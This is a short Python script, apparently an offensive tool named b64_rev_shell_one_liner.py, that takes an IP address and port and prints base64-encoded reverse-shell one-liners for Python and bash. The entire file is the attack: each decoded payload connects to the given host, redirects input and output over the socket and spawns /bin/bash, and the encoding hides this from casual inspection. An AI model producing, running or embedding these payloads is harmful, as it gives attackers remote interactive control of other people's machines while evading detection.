#!/usr/bin/python3
from sys import argv
import base64
try:
	print("For python: \nexec(__import__( 'base64' ).b64decode({}))".format(base64.b64encode('import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'.format(argv[1], argv[2]).encode())))
	print("For bash: \npython3 -c \"{}\"".format("exec(__import__( 'base64' ).b64decode({}))".format(base64.b64encode('import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'.format(argv[1], argv[2]).encode()))))
except:
	print('Usage: python3 b64_rev_shell_one_liner.py ip port')